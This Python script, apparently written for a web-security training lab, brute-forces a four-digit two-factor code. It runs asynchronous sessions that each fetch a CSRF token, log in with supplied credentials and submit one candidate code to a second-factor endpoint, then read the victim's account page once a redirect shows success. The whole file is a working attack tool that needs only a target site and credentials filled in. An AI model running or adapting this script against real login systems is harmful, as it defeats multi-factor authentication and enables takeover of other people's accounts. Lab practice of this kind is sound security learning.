import aiohttp
import asyncio
from bs4 import BeautifulSoup
import time

async def main():
    # Set up some variables to access the login and 2fa login pages
    site = ""
    username = ""
    password = ""

    # A new client session for each attempt for this script
    # Each coroutine appended to the list will attempt at guessing the 2fa code

    attempts = []
    for i in range(0, 2001):
        session = aiohttp.ClientSession()
        mfacode = str(i).zfill(4)
        attempts.append(brute(site, session, username, password, mfacode))
    # Gather the functions and kick them off. Print the successful code and success page.
    await asyncio.gather(*attempts)

async def login_csrf(site, session):
    """ GET the login page csrf token before we POST
    Args:
        site (str): login to test
        session (aiohttp): web client session
    Returns:
        string: CSRF token                
    """
    async with session.get(f'https://{site}/login') as resp:
        soup = BeautifulSoup(await resp.text(),'html.parser')
        return soup.find('input', {'name':'csrf'}).get('value')

async def post_login(site, session, username, password, csrf):
    """ POST our login creds and return our CSRF token for the 2fa
    Args:
        site (str): login to test
        session (aiohttp): web client session
        username (str): username to log in
        password (str): password to log in
        csrf (str): CSRF token from previous GET
    Returns:
        string: CSRF token                
    """
    logindata = {
        'csrf' : csrf,
        'username' : username,
        'password' : password
    }
    async with session.post(f'https://{site}/login', data=logindata) as resp:
        soup = BeautifulSoup(await resp.text(),'html.parser')
        return soup.find('input', {'name':'csrf'}).get('value')

async def post_2fa(site, session, csrf, mfacode):
    """ POST our login creds and return our CSRF token for the 2fa
    Args:
        site (str): login to test
        session (aiohttp): web client session
        csrf (str): CSRF token from previous GET
        mfacode (str): multi-factor code to submit
    Returns:
        int: response status code                
    """
    logindata = {
        'csrf' : csrf,
        'mfa-code' : mfacode
    }
    async with session.post(f'https://{site}/login2', data=logindata, allow_redirects=False) as resp:
        soup = BeautifulSoup(await resp.text(),'html.parser')
    return resp.status

async def brute(site, session, username, password, mfacode):
    """ One attempt at brute forcing 2fa. Prints our result.
    Args:
        site (str): login to test
        session (aiohttp): web client session
        username (str): username to log in
        password (str): password to log in
        mfacode (str): multi-factor code to submit
    """
    csrf = await login_csrf(site, session)
    time.sleep(.001) 
    csrf = await post_login(site, session, username, password, csrf)
    time.sleep(.001) 
    status = await post_2fa(site, session, csrf, mfacode)
    if status == 302:
        print(f'2fa valid with response code {status}')
        print(f'Success! mfa-code is: {mfacode}')
        async with session.get(f'https://{site}/my-account?id=carlos') as resp:
            soup = BeautifulSoup(await resp.text(),'html.parser')
            print(soup)
        loop = asyncio.get_event_loop()
        # loop.shutdown_asyncgens()
        loop.stop()
        loop.close()
    else:
        print(f'2fa invalid with response code: {status}') 
        await session.close()

await main()        
# loop = asyncio.get_event_loop()
# loop.run_until_complete(main())
